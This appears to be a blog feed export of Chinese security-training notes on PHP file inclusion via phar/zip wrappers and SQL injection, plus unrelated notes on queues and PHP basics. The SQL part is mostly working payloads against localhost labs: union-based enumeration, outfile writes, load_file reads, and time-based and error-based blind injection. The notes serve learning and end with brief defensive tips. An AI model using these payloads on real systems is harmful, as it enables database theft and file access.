<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    include($file.&quot;.jpg&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>此时重复以上三步并构建：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file&#x2F;1.php?file&#x3D;phar:&#x2F;&#x2F;c.zip&#x2F;c</span><br><span class="line">或</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file&#x2F;1.php?file&#x3D;zip:&#x2F;&#x2F;c.zip%23c</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>米斯特安全培训</category>
      </categories>
  </entry>
  <entry>
    <title>sql注入基础</title>
    <url>/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><h2 id="消除之后字符串的几种方法"><a href="#消除之后字符串的几种方法" class="headerlink" title="消除之后字符串的几种方法"></a>消除之后字符串的几种方法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;George&#39; &amp;23   [%23 url解码后是#]</span><br><span class="line"></span><br><span class="line">?name&#x3D;George&#39; --%20   [%20 url解码后是space]</span><br><span class="line"></span><br><span class="line">?name&#x3D;George&#39; --+   [+ url解码后是space]</span><br></pre></td></tr></table></figure>



<h2 id="怎么测试自己想要输入的东西"><a href="#怎么测试自己想要输入的东西" class="headerlink" title="怎么测试自己想要输入的东西"></a>怎么测试自己想要输入的东西</h2><p>使用union函数</p>
<p><strong>注意：使用union要注意前后列数相同</strong></p>
<h2 id="怎么确定有多少列？"><a href="#怎么确定有多少列？" class="headerlink" title="怎么确定有多少列？"></a>怎么确定有多少列？</h2><blockquote>
<p>order by n 指的是根据第n列进行排序，而当n&gt;真实列数之后就会报错</p>
</blockquote>
<h2 id="怎么回显出你想要的数据？"><a href="#怎么回显出你想要的数据？" class="headerlink" title="怎么回显出你想要的数据？"></a>怎么回显出你想要的数据？</h2><p>正常回显一般显示第一行数据，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p>会回显：</p>
<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1.png" alt="1"></p>
<p>此时需要使第一个条件无法检索出来数据，例如使用不存在的字段‘To’</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;To&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p>会回显：</p>
<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2.png" alt="2"></p>
<h2 id="怎么判断一个表、列、字段是否存在？"><a href="#怎么判断一个表、列、字段是否存在？" class="headerlink" title="怎么判断一个表、列、字段是否存在？"></a>怎么判断一个表、列、字段是否存在？</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select exists (查询语句)</span><br><span class="line">select exists (select * from sql_1)</span><br></pre></td></tr></table></figure>

<p>sql注入时，可以：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; union select exists (select * from sql_1) --+</span><br></pre></td></tr></table></figure>

<p>测试是否有叫  ‘sql_1’  的表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; union select exists (select username from sql_1) --+</span><br></pre></td></tr></table></figure>

<p>测试是否有叫  ‘username’  的列名</p>
<h2 id="几种sql注入方法"><a href="#几种sql注入方法" class="headerlink" title="几种sql注入方法"></a>几种sql注入方法</h2><h3 id="最蠢的猜"><a href="#最蠢的猜" class="headerlink" title="最蠢的猜"></a>最蠢的猜</h3><ol>
<li><p>判断注入点【数字型？字符型？通配型？】</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39;</span><br><span class="line">通过回显判断注入点</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断列数【order函数】</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; order by 3 --+</span><br><span class="line">寻找报错和不报错的临界值</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜库名、表名、列名【and exists】</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; and exists(select * from sql_2) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/3.png" alt="3"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; and exists(select * from sql_3) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/4.png" alt="4"></p>
</li>
<li><p>爆出字段名【union select】</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;xxxxx&#39; union select 1,pw,username  from sql_2 where id&#x3D;2--+</span><br><span class="line">改变id的值可以查看所有字段的值</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/5.png" alt="5"></p>
</li>
</ol>
<h3 id="最基本的注入步骤"><a href="#最基本的注入步骤" class="headerlink" title="最基本的注入步骤"></a>最基本的注入步骤</h3><p>先了解一下各类数据表的位置和结构【自己画的好看吧嘿嘿】：</p>
<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/sql%E7%BB%93%E6%9E%84.jpg" alt="sql结构"></p>
<p>第一步：判断是否存在注入点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;John&#39;</span><br></pre></td></tr></table></figure>

<p>第二步：确定注入点以后，确定列数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;John&#39; order by 3 --+</span><br></pre></td></tr></table></figure>

<p>第三步：确定数据库的名字【test】</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;xxxxxxx&#39; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/6.png" alt="6"></p>
<blockquote>
<p>这里之所以是“1,database(),3”是因为之前确定了列数是3列</p>
</blockquote>
<p>如果不要所在数据库的名字，可以使用以下方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php&#x2F;?username&#x3D;xxx&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br></pre></td></tr></table></figure>

<p>第四步：确定数据表的名字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 5,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;sqli&quot; --+</span><br></pre></td></tr></table></figure>

<p>第五步：确定列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-f678feb4bc46bf1b.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;-1&#39; union select 5,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&quot;sqli&quot; and table_name&#x3D;&quot;flag&quot;--+</span><br></pre></td></tr></table></figure>

<p>第六步：获取字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>注：有时会遇到where information_schema.schemata=’hhh’，有时‘hhh’里的单引号会产生意料之外的错误。此时可以对hhh进行十六进制编码。例如where information_schema.schemata=686868</p>
</blockquote>
<h2 id="数据的读取和输出"><a href="#数据的读取和输出" class="headerlink" title="数据的读取和输出"></a>数据的读取和输出</h2><h3 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select xxx into outfile &quot;绝对路径&quot;</span><br><span class="line">例如：</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php&#x2F;?username&#x3D;xxx&#39; union select 1,database(),3 into outfile &quot;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;1.txt&quot; --+</span><br></pre></td></tr></table></figure>

<h3 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h3><p>load_file()</p>
<p>replace()</p>
<p>hex()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php&#x2F;?username&#x3D;xxx&#39; union select 1,load_file(&quot;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;1.txt&quot;),3 --+</span><br><span class="line">或者</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php&#x2F;?username&#x3D;xxx&#39; union select 1,load_file(0x443a2f70687073747564795f70726f2f5757572f312e747874),3 --+【hex编码】</span><br><span class="line">一定要记住：hex转码后，要在前面加上0x</span><br></pre></td></tr></table></figure>







<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h4 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(a,b,c)</span><br></pre></td></tr></table></figure>

<p>若a为true，则b；若a为假，则c；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sleep(time)</span><br></pre></td></tr></table></figure>

<p>延迟time秒,之后返回0</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mid(str,start,len)</span><br></pre></td></tr></table></figure>

<p>截取str，从start开始截取len长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ascii(a)</span><br></pre></td></tr></table></figure>

<p>将a进行ascii编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">length(str)</span><br></pre></td></tr></table></figure>

<p>获取str的长度</p>
<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>1.确定要求字符串的长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if(length(user())&#x3D;n,sleep(5),1)</span><br></pre></td></tr></table></figure>

<p>2.求字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if(ascii(mid(user(),1,1))&#x3D;n,sleep(5),1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str &#x3D; select gruop_concat(column_name) from information_schema.columns where table_schema &#x3D; 0x[hex] and table_name &#x3D; 0x[hex]</span><br><span class="line"></span><br><span class="line">id&#x3D;1 and if(  ascii( mid(str,1,1) )&#x3D;n,sleep(5),1  )</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and if(mid(user(),n,1) like &#39;r%&#39;,sleep(5),1)</span><br><span class="line">使用通配符，改变n的大小来获取值</span><br></pre></td></tr></table></figure>





<h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><h4 id="几个函数-1"><a href="#几个函数-1" class="headerlink" title="几个函数"></a>几个函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(字段名&#x2F;id&#x2F;*) from sql_1</span><br></pre></td></tr></table></figure>

<p>统计id列有多少行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select rand(n)</span><br></pre></td></tr></table></figure>

<p>随即返回一个0-1之间的浮点数，n参数如果固定则产生的随机数不会改变</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">floor(n)</span><br></pre></td></tr></table></figure>

<p>对n进行取整操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">group by x</span><br></pre></td></tr></table></figure>

<p>以x列中的值为主键进行排序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">concat(str1,str2,str3)</span><br></pre></td></tr></table></figure>

<p>连接几个字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">limit start,len</span><br></pre></td></tr></table></figure>

<p>限制输出的字段个数，从start个字段开始输出len个</p>
<h4 id="步骤拆解"><a href="#步骤拆解" class="headerlink" title="步骤拆解"></a>步骤拆解</h4><p>先来了解如何报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*),(floor(rand(0)*2))x from sql_3 group by x;</span><br></pre></td></tr></table></figure>

<p>此时x=(floor(rand(0)*2))，也就是会生成0，1，1，0，1.</p>
<p>具体为何请移步：<a href="http://albatross-g.site/2020/02/09/sql报错型注入/" target="_blank" rel="noopener">sql报错型注入</a></p>
<p>报错内容为：</p>
<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/7.png" alt="7"></p>
<p>这个1来自于floor(rand(0)*2)，那我们就可以好好利用这个报错回显：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*),(concat(database(),0x7e,floor(rand(0)*2)))x from sql_3 group by x;</span><br></pre></td></tr></table></figure>

<p>报错内容为：</p>
<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/8.png" alt="8"></p>
<p>其中0x7e是~的十六进制</p>
<p>可是此时还需注意一点：</p>
<p>注入时是用的and连接两个select，如果直接这样，二者无交集会报语法错误。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and select count(*),(concat(database(),0x7e,floor(rand(0)*2)))x from sql_3 group by x --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/9.png" alt="9"></p>
<p>于是构建：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_2.php?username&#x3D;John&#39; and (select 1 from(select count(*),(concat(database(),0x7e,floor(rand(0)*2)))x from sql_3 group by x)a) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/10.png" alt="10"></p>
<blockquote>
<p>接下来我们要用的时候只需改一下database()这块，不过这块也有许多这样那样的限制，需要多多研究</p>
</blockquote>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_2.php?username&#x3D;John&#39; and (select 1 from(select count(*),(concat((select schema_name from information_schema.schemata limit 1,1),0x7e,floor(rand(0)*2)))x from sql_3 group by x)a) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/11.png" alt="11"></p>
<p>说明第二个数据库的名字叫challenge</p>
<h2 id="几种基础的防sql注入方法"><a href="#几种基础的防sql注入方法" class="headerlink" title="几种基础的防sql注入方法"></a>几种基础的防sql注入方法</h2><h3 id="整数型注入点"><a href="#整数型注入点" class="headerlink" title="整数型注入点"></a>整数型注入点</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1</span><br></pre></td></tr></table></figure>

<p>面对整数型注入点可以使用intval()函数，例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">intval($_GET[&#39;id&#39;])</span><br></pre></td></tr></table></figure>



<p>或者可以range(1,n)创建白名单数组，然后用in_array(src,des)【src是否在des里]】,来检测。但是in_array(src,des)是弱比较类型，可能会存在一定漏洞。然后可以使用gettype()或者var_dump判断数据类型。</p>
]]></content>
      <categories>
        <category>米斯特安全培训</category>
      </categories>
  </entry>
  <entry>
    <title>队列</title>
    <url>/2020/05/09/%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>先进者先出，队列中最基本的操作是：入队enqueue()【放一个数据到队尾】，出队dequeue()【从队列头部取一个数据】。</p>
<h2 id="基础分类"><a href="#基础分类" class="headerlink" title="基础分类"></a>基础分类</h2><h3 id="顺序队列【数组实现】"><a href="#顺序队列【数组实现】" class="headerlink" title="顺序队列【数组实现】"></a>顺序队列【数组实现】</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用数组实现的队列</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayQueue</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 数组：items，数组大小：n</span></span><br><span class="line">  <span class="keyword">private</span> String[] items;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// head表示队头下标，tail表示队尾下标</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> head = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 申请一个大小为capacity的数组</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">    items = <span class="keyword">new</span> String[capacity];</span><br><span class="line">    n = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果tail == n 表示队列已经满了</span></span><br><span class="line">    <span class="keyword">if</span> (tail == n) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    items[tail] = item;</span><br><span class="line">    ++tail;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 出队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">dequeue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果head == tail 表示队列为空</span></span><br><span class="line">    <span class="keyword">if</span> (head == tail) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 为了让其他语言的同学看的更加明确，把--操作放到单独一行来写了</span></span><br><span class="line">    String ret = items[head];</span><br><span class="line">    ++head;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/%E9%98%9F%E5%88%97/1.jpg" alt="1"></p>
<p><img src="/2020/05/09/%E9%98%9F%E5%88%97/2.jpg" alt="2"></p>
<p>我们可以发现，进行几次入列出列的操作后，head和tail都会往后移动，那既然移动则无可避免地要到达数组的最大值，此时就要用到<strong>数据搬移</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// 入队操作，将item放入队尾</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// tail == n表示队列末尾没有空间了</span></span><br><span class="line">  <span class="keyword">if</span> (tail == n) &#123;</span><br><span class="line">    <span class="comment">// tail ==n &amp;&amp; head==0，表示整个队列都占满了</span></span><br><span class="line">    <span class="keyword">if</span> (head == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 数据搬移</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = head; i &lt; tail; ++i) &#123;</span><br><span class="line">      items[i-head] = items[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 搬移完之后重新更新head和tail</span></span><br><span class="line">    tail -= head;</span><br><span class="line">    head = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  items[tail] = item;</span><br><span class="line">  ++tail;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="链式队列【链表实现】"><a href="#链式队列【链表实现】" class="headerlink" title="链式队列【链表实现】"></a>链式队列【链表实现】</h3><p>而链表的入列出列操作就有点类似于链表的增删：</p>
<p><img src="/2020/05/09/%E9%98%9F%E5%88%97/3.jpg" alt="3"></p>
<h2 id="其他分类"><a href="#其他分类" class="headerlink" title="其他分类"></a>其他分类</h2><h3 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h3><p><img src="/2020/05/09/%E9%98%9F%E5%88%97/%E5%BE%AA%E7%8E%AF%E5%88%97%E8%A1%A8.jpg" alt="循环列表"></p>
<p>对于循环列表来说，最重要的是确定<strong>队空条件</strong>和<strong>队满条件</strong>。</p>
<ul>
<li>队空条件：head==tail</li>
<li>队满条件：(tail+1)%n==head</li>
</ul>
<blockquote>
<p>队满条件之所以不直接使用“tail+1==head”是因为tail+1可能重新开始了一个循环。</p>
<p>例如tail=n-1【7】，而head=0</p>
</blockquote>
<p><strong>show you code：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CircularQueue</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 数组：items，数组大小：n</span></span><br><span class="line">  <span class="keyword">private</span> String[] items;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// head表示队头下标，tail表示队尾下标</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> head = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 申请一个大小为capacity的数组</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">CircularQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">    items = <span class="keyword">new</span> String[capacity];</span><br><span class="line">    n = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 队列满了</span></span><br><span class="line">    <span class="keyword">if</span> ((tail + <span class="number">1</span>) % n == head) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    items[tail] = item;</span><br><span class="line">    tail = (tail + <span class="number">1</span>) % n;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 出队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">dequeue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果head == tail 表示队列为空</span></span><br><span class="line">    <span class="keyword">if</span> (head == tail) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    String ret = items[head];</span><br><span class="line">    head = (head + <span class="number">1</span>) % n;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="阻塞队列"><a href="#阻塞队列" class="headerlink" title="阻塞队列"></a>阻塞队列</h3><p>队列空时，从头取数据会被阻塞，直到有了数据才会再取数据；队列满时，插入数据会被阻塞，直到有空闲位置才会再插入。</p>
<p>就像一个“<strong>生产者消费者模型</strong>”！</p>
<h3 id="并发队列"><a href="#并发队列" class="headerlink" title="并发队列"></a>并发队列</h3><p>指 线程安全的队列。</p>
<blockquote>
<p>最简单直接的实现方式是直接在 enqueue()、dequeue() 方法上加锁，但是锁粒度大并发度会比较低，同一时刻仅允许一个存或者取操作。实际上，基于数组的循环队列，利用 CAS 原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。在实战篇讲 Disruptor 的时候，我会再详细讲并发队列的应用。</p>
</blockquote>
]]></content>
      <categories>
        <category>数据结构与算法之美</category>
      </categories>
  </entry>
  <entry>
    <title>php基础</title>
    <url>/2020/05/07/php%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="连接字符串与变量"><a href="#连接字符串与变量" class="headerlink" title="连接字符串与变量"></a>连接字符串与变量</h2><p>用.连接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$name=<span class="string">'Ben'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'my name is'</span> .$name;</span><br></pre></td></tr></table></figure>

<h2 id="定义常量"><a href="#定义常量" class="headerlink" title="定义常量"></a>定义常量</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define(<span class="string">'NAME'</span>,<span class="string">"Value"</span>);</span><br><span class="line"><span class="keyword">const</span> NAME=<span class="string">'Value'</span>;</span><br></pre></td></tr></table></figure>

<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="自动分配下标"><a href="#自动分配下标" class="headerlink" title="自动分配下标"></a>自动分配下标</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$name = <span class="keyword">array</span>(<span class="string">"George"</span>,<span class="string">"Ben"</span>,<span class="string">"Carol"</span>);</span><br><span class="line"><span class="keyword">echo</span> $name[<span class="number">1</span>];</span><br></pre></td></tr></table></figure>

<h3 id="手动分配下标"><a href="#手动分配下标" class="headerlink" title="手动分配下标"></a>手动分配下标</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$name = <span class="keyword">array</span>(<span class="string">"cool"</span>=&gt;<span class="string">"George"</span>,<span class="string">"stupid"</span>=&gt;<span class="string">"Ben"</span>,<span class="string">"beautiful"</span>=&gt;<span class="string">"Carol"</span>);</span><br><span class="line"><span class="keyword">echo</span> $name[<span class="string">'cool'</span>];</span><br></pre></td></tr></table></figure>



<h2 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h2><h3 id="自动分配下标-1"><a href="#自动分配下标-1" class="headerlink" title="自动分配下标"></a>自动分配下标</h3><p><img src="/2020/05/07/php%E5%9F%BA%E7%A1%80/Snipaste_2020-05-07_11-02-38.png" alt="2"></p>
<h3 id="手动分配下标-1"><a href="#手动分配下标-1" class="headerlink" title="手动分配下标"></a>手动分配下标</h3><p><img src="/2020/05/07/php%E5%9F%BA%E7%A1%80/1.png" alt="1"></p>
]]></content>
      <categories>
        <category>米斯特安全培训</category>
      </categories>
  </entry>
  <entry>
    <title>web漏洞基本类型</title>
    <url>/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="HTML注入"><a href="#HTML注入" class="headerlink" title="HTML注入"></a>HTML注入</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxx.com?input&#x3D;&lt;h1&gt;key&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/html%E6%B3%A8%E5%85%A5.png" alt="html注入"></p>
<p>把原有背景用白色覆盖，在上面加上自己的代码【将密码发给黑客的数据库】</p>
<h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><h3 id="修复点"><a href="#修复点" class="headerlink" title="修复点"></a>修复点</h3><ol>
<li>输入点</li>
<li>输出点</li>
</ol>
<h3 id="修复函数"><a href="#修复函数" class="headerlink" title="修复函数"></a>修复函数</h3><p>用了之后htmlspecialchars()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxx.com?input&#x3D;&lt;h1&gt;key&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure>

<p>显示</p><h1>key</h1><p></p>
